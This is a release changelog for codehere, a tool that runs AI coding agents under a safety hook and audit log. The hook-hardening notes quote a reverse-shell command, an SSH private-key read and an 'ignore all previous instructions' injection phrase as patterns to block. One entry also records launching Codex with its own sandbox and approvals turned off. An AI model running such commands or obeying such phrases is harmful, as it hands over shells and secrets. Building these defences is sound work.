Codehere now sees every aider action — `Run`, `Edit`, `Write` — as steps in the live progress feed. Same dashboard, same timeline shape as Claude / Codex / Gemini. Built by parsing aider's stdout (since aider doesn't expose a structured event stream); blocking-level parity is on the same v0.5 track once the upstream PR for `--pre-action-hook` lands.

### Honest scope

- **The PreToolUse safety hook still wraps Claude Code only.** Codex / Aider / OpenCode / Gemini / generic CLI agents run with session-level tracing (start/end, files touched, tokens used) and now F3 memory injection — but not per-tool blocking. Per-adapter hook parity is the v0.6 track.
- **The auto-dream pipeline (the thing that POPULATES `.codehere/memory/candidates/`) is not in v0.5.** v0.5 ships the graduation primitives — `--add`, `--accept`, `--reject` — so when auto-dream lands in v0.6 the workflow is already there. For now, you graduate by `--add` directly or by hand-dropping JSON files into `.codehere/memory/candidates/` and running `--accept <filename>`.
- **F3 value-prop loop end-to-end with measurement is not yet validated.** The mechanism (memory captured → graduated → injected on next spawn) is structurally verified per-component. Whether agents *behave* measurably differently with vs without the injected prefix is the next experiment, not a v0.5 claim.

### Note on the version number

- Why `0.5.0-alpha.1` not `0.5.0-alpha` or `0.5.0-alpha.0`: the slots `0.5.0-alpha`, `0.5.0-alpha.0`, `0.5.1-alpha`, `0.5.2-alpha`, and `0.5.3-alpha` were all published in December 2025 and unpublished, which permanently reserves those version numbers. The first publishable `v0.5.x-alpha` is therefore `0.5.0-alpha.1`. The pre-tag `npm view codehere versions` check that caught this is now part of the standing release procedure.

### Still planned for v0.5.0 stable / v0.6.0
- F6 Conductor scaffold — codehere's own meta-agent (plain English in, actions out)
- Slack-shape thread UX with `@agent` mention routing
- Per-tool hook coverage parity for Codex / Aider / OpenCode / Gemini / generic adapters
- Tier 2 free OSS model fallback (Kimi K2 / Qwen Coder) for zero-agent bootstrap
- Kiro CLI adapter (deferred until install path validated)
- Trust-scorer enhancement: catch TypeScript quality smells (`as any`, `// @ts-ignore`, `eslint-disable`)
- ProgressAggregator: pluggable per-adapter design (today: switch-on-id with hand-wired handlers)
- Auto-dream pipeline (the candidate populator) — completes the F3 graduation loop

See [CODEHERE.md §5](./CODEHERE.md#5-roadmap--foundations-f0f6) for full roadmap.

---

## [0.4.1] — 2026-04-27

### Added
- **Google Gemini** joins the built-in agent line-up. Codehere now spawns Claude Code, Codex, Aider, OpenCode, and Gemini from the same web UI / CLI. Set `GEMINI_API_KEY` (free at `aistudio.google.com/apikey`) to use it.
- **Cursor MCP integration guide** at `docs/integrations/CURSOR.md`. One paste into Cursor's MCP settings and Cursor's chat can call codehere's `_trust` / `_scan` / `_review` / `_audit` tools without leaving the IDE.
- **Live progress for Gemini tasks** — read / edit / shell steps stream into the dashboard the same way they do for Claude Code.

### Honest scope
- The PreToolUse safety hook still wraps **Claude Code only**. Codex / Aider / OpenCode / Gemini run with session-level tracing (start/end, files touched, tokens used) but not per-tool blocking. Per-adapter hook parity is on the v0.5 track.
- Per-MCP-call audit logging in `~/.codehere/audit/hook-events.jsonl` is also v0.5 work — today the audit log is populated by the Claude hook only.

### Note
- Why `0.4.1` not `0.4.0`: the `0.4.0` slot on npm was published once in December 2025 and unpublished, which permanently reserves the version number. The first publishable `v0.4.x` stable is therefore `0.4.1`.

---

## [0.3.4] — 2026-04-26

### Changed
- **Recipe doc** worked-example section is self-verifying: tells you exactly how to reproduce on your own machine and explains what the captured numbers (`trust 100/100`, token counts, `43s`) actually mean. No more numbers without context.

---

## [0.3.3] — 2026-04-26

### Changed
- **Recipe doc** worked example replaced with a real captured run (was an aspirational placeholder). The actual diff codehere produced, the trust score it returned, the token counts — all from a session you can reproduce with `codehere status --sessions`.

---

## [0.3.2] — 2026-04-26

### Added
- **`codehere init`** — scaffolds `.codehere/CONTEXT.md`, `HANDOVER.md`, `PROMPTS.md` at your repo root. Run once per project. Works from any sub-directory; refuses to follow symlinks; idempotent (re-runs skip existing files unless `--force`).
- **`docs/RECIPE.md`** — one-page guide: 6-step setup, prompt formula (Context + End State + Constraints), 4 ready-to-use prompt shapes, worked example, pro tips.

### Changed
- npm README leads with the recipe (setup table + prompt formula + folder convention) instead of substrate description.

---

## [0.3.1] — 2026-04-26

**First publishable stable of the v0.3 line.** The audit-first foundation of the codehere PM — substrate ready for solo developers today.

### What's in this release
- **PreToolUse safety hook** — intercepts every `Bash`/`Edit`/`Write`/`MultiEdit`/`NotebookEdit` call from any Claude Code session, runs it through the trust-scorer pattern bank in under 5 ms, blocks dangerous patterns, appends every decision to `~/.codehere/audit/hook-events.jsonl`.
- **Trust score on every file** — local 0–100 grade, A–F classification, no API key required.
- **Plain-English Final Report** — `codehere report --simple` produces a shareable audit you can paste into a PR.
- **Web UI** at `http://127.0.0.1:3773` for delegating tasks. CLI parity via `codehere task`. REPL with live slash palette.
- **MCP server** (`codehere serve`) exposes 4 trust tools to any MCP client (Claude Desktop, Cursor, Zed, Cline, Continue).
- **4 built-in agent adapters**: Claude Code, Codex, Aider, OpenCode. Conductor router for "Auto" agent selection. Optional generic CLI adapter via `~/.codehere/agents.yaml`.
- **`codehere setup`** — first-run check for API keys, codebase, and config.

### Honest scope — read this before evaluating
- **Safety hook coverage is Claude Code-only today.** Codex, Aider, and OpenCode tasks are launched and observed by codehere — you get session-level lifecycle records and a Final Report — but tool calls are not blocked at the per-tool level. Per-adapter hook parity is v0.4+ work.
- **No project memory across sessions yet** — agents start cold each task. F3 memory layer ships in v0.5.
- **No LLM-based "Auto" routing yet** — current routing is rule-based. F4 LLM classifier ships in v0.6.
- **No multi-step task decomposition yet** — each task is one prompt to one agent. F5 ships in v0.7.
- **Audit log is append-only, not yet tamper-evident** (no signing, no hash chain). Cryptographic integrity is on the v1.0 hardening track.

### Note
- Why `0.3.1` not `0.3.0`: the `0.3.0` slot was published to npm on 2025-12-03 and unpublished. npm tombstones unpublished version slots permanently. The first publishable `v0.3.x` stable is therefore `0.3.1`.

---

## [0.3.0-rc.13 → rc.20] — 2026-04-26

**Dogfood-driven RC hardening cycle.** Eight tightly-scoped iterations between rc.12 and rc.20, all arising from real terminal use of the rc.12 build during a single tmux session. Each rc fixes one named bug or ships one named UX foundation; each was Codex-reviewed via the multi-agent dogfood loop before the next iteration. **No new feature surface — only sharper edges.**

### Added
- `docs/UX_OBSERVATIONS.md` — single source of truth for severity-tagged UX findings (P0–P3 + positive patterns) with evidence per finding · [54bcbf3]
- `scripts/dogfood-e2e.sh` — exhaustive CLI E2E harness · 38 capabilities (every documented command + every flag + hook moat positive blocks) · [01c898e]
- `scripts/web-e2e.sh` — Web UI HTTP probe harness · 16 endpoints · MCP roundtrip · POST /api/task validation · [aa07e33]
- `scripts/changelog-distill.sh` — commit-to-CHANGELOG distillation between two refs · [408f8d0]
- `.github/workflows/ci.yml` — three-job pipeline (build+test → cli-e2e → web-e2e) on every push to dev/* and PR · [aa07e33]
- `agent/src/utils/typo-guard.ts` — pure-function module · real Levenshtein + length floor + kebab exemption · [2a8ac63]
- New endpoint: `GET /api/version` returns `{ version, name }` for ops monitoring · [8aa55d9]

### Changed (UX)
- `health --json` flag is now actually implemented (was advertised in help, missing from binary) · [01c898e]
- `report --json` defaults to **stdout** (was silently writing `codehere-audit.json` and breaking pipelines) · [01c898e]
- `report` flags `--json|--simple` and `--stdout|--out` are now explicit mutex (exit 2 with clear message instead of silent precedence) · [db69bf7]
- `--help` footer points at `codehere help` for the grouped overview · [db69bf7]
- Amplification-alert framing softened: "long session, review if unattended" by default; "high block rate, review for injection" only when blocked/total > 5% · [8aa55d9]
- REPL banner shows scannable count alongside total: "agent · dir · 2147 files (58 scannable)" · [ac0a7e6]
- `GET /mcp` returns proper `405 Method Not Allowed` + `Allow: POST` (was `404`) · [8aa55d9]

### Fixed
- Conductor session events: routing-decision event was being delivered **twice** to every subscriber (once via buffer-replay, once via deferred microtask emit). REPL printed `routing → ...` twice per task. Fix removes the deferred emit; buffer replay alone delivers once · [bb3c308]
- Conductor session status stuck at `running` forever after specialist exit. Specialists emit `exit` (never `codehere:complete`); Conductor was only mirroring on the latter, leaving session.status stale and the REPL printing `✗ └─ running` after success · [bb3c308]
- `trust .` on the codehere repo no longer pollutes scan with cloned upstream repos under `.oss-repos/` (added to `IGNORE_DIRS`) · [81c410a]
- `status --since bogus` now exits 1 with the existing error message in **all** modes (was only validated inside the `--export` branch) · [01c898e]
- Bare `codehere <typo>` (e.g. `codehere helpp`) catches single-word typos via Levenshtein and exits 1 with a "Did you mean: ..." hint instead of silently spawning an API task on the typo string · [01c898e, 2a8ac63]
- `/api/version` 500-response no longer leaks filesystem paths via `detail: String(e)`; full error logged server-side for the operator only · [e3e571d, ac0a7e6]
- `web-e2e.sh` fails fast (exit 2) when the spawned codehere server doesn't become healthy within 15s, dumping the boot log to stderr · [e3e571d]
- `web-e2e.sh` Ctrl-C / SIGTERM now actually aborts the harness (cleanup was running but the script continued) · [ac0a7e6]
- `dogfood-e2e.sh` keeps `set -uo pipefail` enabled while the four `head -1` sampling cases use a no-pipe `sample_first_line()` helper to avoid SIGPIPE false-fails · [e3e571d]

### Tests
- `agent/test/cli/typo-guard.test.ts` (NEW) — 42 unit tests · positive typos suggest, kebab/short/multi-word/known-cmd fall through, Levenshtein primitives, ranking determinism, length boundaries · [2a8ac63]
- `agent/test/cli/rc15-fixes.test.ts` (NEW) — 21 subprocess integration tests pinning every rc.15+rc.16+rc.18 user-visible behavior · [2a8ac63, db69bf7]
- `agent/test/cli/conductor.test.ts` — added 7 regression+edge-case tests (single-routing emit, exit→completed/killed/error mirror, late subscriber buffer replay, synthesizeSession error path, synchronous spawn throw, registry drift, kill-during-running) · [bb3c308, 2a8ac63, 8aa55d9]
- `agent/test/cli/mcp-fuzz.test.ts` — updated for 405 (was 404) + 1 new test for `/api/version` shape · [8aa55d9]
- Test totals: 278 → **350** across 20 files (+72 in this cycle).

### Methodology (this cycle, kept as repo discipline)
- **Multi-agent dogfood loop** — every non-trivial commit Codex-reviewed before next rc. Found a real regression in rc.15 (typo guard over-matched; broke legitimate prompts), fixed in rc.16. Without the loop, rc.15 would have shipped to npm worse than rc.12.
- **Three harness tiers** — vitest (unit + subprocess) · `dogfood-e2e.sh` (CLI surface) · `web-e2e.sh` (HTTP) — all CI-runnable, all green at every rc. Foundation for safer future merges.

---

## [0.3.0-rc.1] — 2026-04-26

**Release candidate.** Substantial breaking changes from the v0.3.0-beta lineage. Locks the v0.3 surface as a focused PM-for-AI-coding-agents release.

### Added
- `LICENSE` (MIT) at repo root · [3a59c9e]
- `SECURITY.md` with responsible-disclosure policy + SLA tiers · [3a59c9e]
- `CONTRIBUTING.md` with setup, commit discipline, testing philosophy · [3a59c9e]
- `CODE_OF_CONDUCT.md` referencing Contributor Covenant 2.1 · [04d6b15]
- `.github/ISSUE_TEMPLATE/bug_report.md` · `feature_request.md` · `PULL_REQUEST_TEMPLATE.md` · [04d6b15]
- `AUDIT.md` · graph-based pre-publish audit report · 24 findings categorized + remediated · [f83e263]
- `CODEHERE.md` · product spec · positioning · six-ring adoption · F0–F6 foundations · defensibility · GTM · revenue model · 1043 lines · [11c252c]
- `EXPERIENCE.md` · the human story · enterprise role archetypes through six rings of adoption · [36f9285]
- `.githooks/pre-commit` + `.gitleaks.toml` + `scripts/install-hooks.sh` · gitleaks pre-commit hook blocks future credential leaks · [6f74f23]
- `.nvmrc` pinning Node 20 · [6677ee6]
- `agent/package-lock.json` committed for reproducible installs · [92b2b1b]

### Changed
- **Positioning locked** to "PM for your AI coding agents" with "audit-first traceability" as the moat and "Slack for agents" as the v0.4+ end-state · banned vocabulary list in `product_identity.md` memory: *control plane*, *orchestrator*, *dashboard*, *AI engineering manager*. · [bcef114]
- `package.json` rewritten · version `0.3.0-alpha.0` → `0.3.0-rc.1` · description aligned with v0.3 PM framing · `engines.node` set to `>=20` · `package-lock.json` removed from `.gitignore` · 18 dead test scripts removed · 8 unused production deps removed (cohere-ai, sql.js, tiktoken, inquirer, diff, wrap-ansi, get-tsconfig, resolve-pkg-maps) · [6677ee6]
- Source tree simplified · 240 → 46 TypeScript files (`-81%`) · 6 circular dependencies → 0 · v0.2 legacy code removed end-to-end · [4c1b005, f64f810]
- Agent registry trimmed to honest count · 9 entries (4 dogfooded + 5 scaffolded) → **4 dogfooded only** (Claude Code, Codex, Aider, OpenCode) · users still extend via `~/.codehere/agents.yaml` · [fb2890b]
- README rewritten for v0.3 reality · single page · principle #10 (non-technical accessibility) · 14 honest commands · [fbbaf21]
- npm package size · 4.0 MB unpacked → 1.0 MB · 959 files → 187 files · `-75% / -80%` · [6677ee6]

### Removed (BREAKING)
**29 v0.2 CLI commands removed.** Users running v0.2 commands lose them on upgrade; v0.2.x npm releases retain them.
- AI-powered commands: `ask`, `fix`, `explain`, `plan`, `refactor`, `suggest`
- v0.2 orchestration: `orchestrate`, `react`, `trace`, `decision`, `product`, `run`
- v0.2 utility: `index`, `cache`, `migrate`, `docs`, `git-review`, `knowledge`, `learning`, `learn`, `review`, `review-file`, `test`, `undo`, `cost`, `models`, `telemetry`
- Default smart-routing: `codehere "<query>"` no longer routes intelligently
- Interactive REPL: `codehere` (no args) drops to a quick-start banner instead of an interactive prompt
- Files: `src/session.ts`, `src/agents/*`, `src/intent/*`, `src/tools/*`, `src/verification/*`, all v0.2 use-cases, all v0.2 providers (Cohere/OpenAI/OpenRouter), all v0.2 sqlite repositories, v0.2 retrieval pipeline, v0.2 ai-sast-scanner, etc. · [4c1b005]

### Fixed (Security)
- **CRIT-4** — YAML `process_pattern` ReDoS · `~/.codehere/agents.yaml` patterns now compile through a 100ms smoke-test guard; pathological regex is rejected with a fallback · [313d4da]
- **CRIT-5** — `POST /api/task` agent ID validation · whitelist check before spawn, blocks log-injection via newlines + null bytes · cwd path-traversal defense added · [313d4da]
- **THREAT-2** — `execSync` shell-interpolation surfaces · `git diff ${ref}` in `trust --diff` switched to `execFileSync` array form · 6 of 8 surfaces auto-resolved by D7 v0.2 deletion · [313d4da]
- **T4-A · hook ruleset hardening** — adversarial test suite (20 red-team payloads + 5 benign controls) revealed 4 real gaps in the PreToolUse hook. All four fixed:
  - Prompt-injection pattern now matches chained modifiers (e.g. `ignore all previous instructions`, not only `ignore previous instructions`).
  - SSH private-key reads (`cat ~/.ssh/id_rsa`, `id_ed25519`, `id_ecdsa`, `id_dsa`) promoted from severity `high` to `critical` — they now block on a single match instead of merely logging.
  - Force-push / hard-reset against protected branches (`main`, `master`, `production`, `release`, `prod`) promoted to `critical`. Force-push to feature branches stays `high` (logged-but-allowed) because rebase-and-force-push is routine.
  - Reverse-shell pattern now catches `nc -e <binary> <ip>` form (e.g. `nc -e /bin/bash 192.168.1.42 4444`), not only the IP-immediately-after-`-e` form.
- **T4-B · ReDoS guard upgraded from best-effort to deterministic** — the original CRIT-4 fix relied on a 100ms dynamic smoke test, but Node's regex engine is not interruptible mid-evaluation, so a sufficiently pathological pattern could still hang for minutes once it reached the engine. The fuzz suite caught this. `compileSafePattern` now runs a static paren-depth walk *before* compiling the regex, rejecting any group that contains a quantifier and is itself quantified. The 100ms dynamic check stays as defense-in-depth. Source patterns over 4KB are rejected outright as obvious DoS attempts. The walk is O(n) and cannot itself ReDoS.
- **T4-B · YAML fuzz suite + MCP fuzz suite added** — 35 hostile inputs against `parseSimpleYaml` and the ReDoS guard; 25 hostile inputs against the HTTP server (`/mcp` JSON-RPC, `/api/task` spawn, `/api/agents/:id/install`). Each adversarial input must yield a sane 4xx (or stable JSON-RPC error), never a 500, crash, hang, or unintended side-effect. Catches: prototype pollution, oversized payloads, malformed JSON, type confusion, log-injection via newline in agent ID, NUL-byte cwd traversal, route mismatches.
- 2 moderate `fast-xml-parser` CVEs eliminated · transitive dep of `@aws-sdk/xml-builder` was pulled by `cohere-ai`, removed in T1-B · [6677ee6]

### Tests
- New: `agent/test/cli/hook-adversarial.test.ts` — 27 assertions (20 attacks must block, 5 benign must allow, 2 coverage floors). Asserts the audit moat: if any of these stops being blocked, rc.1 is a no-go.
- New: `agent/test/cli/yaml-fuzz.test.ts` — 35 assertions (21 hostile YAML inputs + 12 ReDoS-guard cases + 2 coverage floors).
- New: `agent/test/cli/mcp-fuzz.test.ts` — 25 assertions across `/mcp`, `/api/task`, `/api/agents/:id/install`.
- Total test count · 129 → 216.

### Decision logs (memory)
Memory files document the chains behind every load-bearing decision in this release:
- Decision 09 · Option D · Karpathy simplify → Cherny trim → CPTO freeze+harden → ship rc.1
- Decision 10 · D7 · trim v0.2 CLI surface · cycles die as side-effect

---

## [0.3.0-beta.3.10] — 2026-04-25 [b38fe6f, 3f4f8ae]

### Added
- Zero-terminal agent install · "Install" button in the readiness dropdown that runs the install command via SSE-streamed subprocess; agent flips to ready on success.
- Per-agent readiness check (`AgentAdapter.checkReadiness()`) · returns `{state, installHint?, authHint?}` per agent
- `GET /api/readiness/agents` endpoint
- Setup-aware dropdown · ✓ ready · ⚠ needs-auth/billed-key · ⤓ needs-install glyphs · inline setup panel · one-click swap to ready agent

## [0.3.0-beta.3.9] — 2026-04-25 [7f122fc]

### Added
- Per-agent readiness state · `ready` · `needs_install` · `needs_auth` · `billed_key_required`
- Aider gets `billed_key_required` flag with explicit subscription-mismatch warning

## [0.3.0-beta.3.8] — 2026-04-25 [72957a4]

### Fixed
- Status pill now reads `error` when an adapter logs a `codehere:error` event, even if subprocess exits 0 (prevents false-COMPLETED for credit-low / auth-rejected scenarios)
- Aider `ERROR_PATTERNS` extended with `credit_low` rule

## [0.3.0-beta.3.7] — 2026-04-25 [b38fe6f]

### Added
- 9 agent adapters in registry (4 installed + 5 scaffolded · *the 5 scaffolded entries were later removed in rc.1's D5 trim · they were never verified on real machines*)
- AiderAdapter (text-stream, no JSONL)
- OpenCodeAdapter (`opencode run --format json` · structured event stream)
- Generic config-driven adapter via `~/.codehere/agents.yaml`

## [0.3.0-beta.3.6] — 2026-04-25 [60810bb]

### Added
- Token usage in Final Report · "Tokens · 7 in · 132 out · 42.2k cached" · cites principle #7 (agent-provenance)

## [0.3.0-beta.3.5] — 2026-04-25 [cf3210f]

### Added
- Daemon-restart session persistence · `~/.codehere/sessions.jsonl` · spawned + completed records · cards re-hydrate as read-only after restart

## [0.3.0-beta.3.4] — 2026-04-25 [50ac31c]

### Added
- 17 unit tests for `progress-aggregator` + `artifacts-extractor`

### Fixed
- Per-session artifact diffing via mtime cutoff · two sessions in same cwd no longer report each other's file changes
- vitest `parseTestSummary` regex picked up "Test Files 11 passed" before "Tests 47 passed"; fix: walk to last match in buffer

## [0.3.0-beta.3.3] — 2026-04-25 [e44d018]

### Added
- Three starter-prompt chips on the empty intake (TRY · Summarize the project · Map the architecture · Run the tests)
- cwd input auto-fills with daemon's launch directory
- README v0.3 rewrite (further refined in rc.1)

### Security
- ANTHROPIC_API_KEY masked in the readiness banner · prior partial-tail display was a credential-fingerprint leak

## [0.3.0-beta.3.2] — 2026-04-25 [f01edca]

### Added
- Hook safety pill on running session cards · "🛡 N safe · K blocked" grows live as tools fire
- Audit summary row above intake · `TODAY · 47 actions · 3 blocked · avg trust 91 · 14 agents` · polled every 30 s

## [0.3.0-beta.3.1] — 2026-04-24 [af8f7ba]

### Fixed
- Final Report block now renders · adapters emit `codehere:artifacts` BEFORE `exit` so the client doesn't close the SSE stream before processing it
- Codex step labels unwrap `/bin/zsh -lc "..."` wrappers · "Run /bin/zsh -lc 'sed -n 1,260p README.md'" → "Read README.md"

## [0.3.0-beta.3] — 2026-04-24 [313dab4]

### Added
- **PM UX Layer 2** · structured progress step list with ⟳ / ✓ / ✗ glyphs (replaces raw event stream as default view on running cards)
- **PM UX Layer 3** · Final Report block · files changed with +/- lines · trust score per file · test pass/fail · token accounting
- **PM UX Layer 7** · status banner above intake · running / detected / blocked / last-edit aggregate

## [0.3.0-beta.2] — 2026-04-24 [7b4a27f]

### Added
- Floating-pill nav matching `codehere.uk` landing aesthetic
- Collapsed-by-default session cards (octogent screenshot-1 pattern)
- Live-dot pulse on running sessions

## [0.3.0-beta.1] — 2026-04-24 [6768127]

### Added
- Design-system pass · ported HSL tokens, peach `#ff9a76` + blue `#4a90e2` accents, `.glass-card`, `.gradient-text-shimmer`, `.glow-line`, `.hero-beam`, `.badge-running-glow` from `codehere-landing/app/globals.css`

## [0.3.0-alpha.7] — 2026-04-24 [efe8640]

### Fixed
- Codex sandbox bypass · `--dangerously-bypass-approvals-and-sandbox` flag (codehere's PreToolUse hook is the external sandbox)
- `command_execution` event renderer matches Codex's actual event shape

## [0.3.0-alpha.6] — 2026-04-24 [1db253d]

### Fixed
- Codex prompt now goes via stdin (was hanging on argv-based passing while stdin was 'ignore')
- Real Codex event shapes used (`thread.started`, `turn.started`, `item.completed`, `turn.completed`)

## [0.3.0-alpha.5] — 2026-04-24 [645a39c]

### Added
- Working-directory input on intake · persisted in localStorage
- Codex `--skip-git-repo-check` flag

## [0.3.0-alpha.4]

### Added
- F2 adapter abstraction · `AgentAdapter` interface
- Codex CLI adapter

## [0.3.0-alpha.3]

### Added
- F1d-v2 process-based agent detection · `ps -A -o pid,tty,etime,args` filter to known agent executables
- "Detected agents on this machine" panel in UI

## [0.3.0-alpha.2]

### Added
- F1a · readiness detection · CLI presence + API key shadow check
- F1b · environment-strip + error fingerprint regex matching → structured `codehere:error` events with recovery hints

## [0.3.0-alpha.1]

### Added
- **F1 foundation** · subprocess spawn of `claude -p` with stream-json parsing
- Web UI for task intake at `localhost:3773`
- SSE event stream per session
- SIGTERM → SIGKILL kill escalation
- `ch task` and `ch kill` CLI commands

---

## [0.2.0] — 2026-04-14

The pre-PM coding-agent release. v0.2 features (`ask`, `fix`, `plan`, `explain`, `refactor`, `index`, etc.) shipped here. v0.2.x npm releases remain for users who depend on those commands.

### Added (highlights)
- F0 substrate · PreToolUse hook handler with 50+ safety patterns
- Trust scorer with 60+ patterns covering SQL injection, XSS, command injection, hardcoded secrets, path traversal, SSRF, weak crypto, JWT bypass, eval injection, prompt injection, credential theft, destructive ops, supply chain
- Audit log (`~/.codehere/audit/hook-events.jsonl`) · append-only JSONL of every tool call decision
- MCP server with 4 tools: `codehere_trust`, `codehere_scan`, `codehere_review`, `codehere_audit`
- CLI commands for v0.2 coding-agent surface (most removed in v0.3.0-rc.1's D7 trim)
- Cost router for model recommendation by trust score
- 4 slash command skills

---

## Notes on retroactive changelog

This file was generated retroactively at v0.3.0-rc.1 from the git tag history. Earlier tagged versions (alpha + beta) did not maintain a per-tag changelog at the time; entries here are derived from commit messages and the full session transcripts in memory. From rc.1 forward, every release ships with a CHANGELOG.md entry as part of the release commit (per `CONTRIBUTING.md` pre-push checklist).
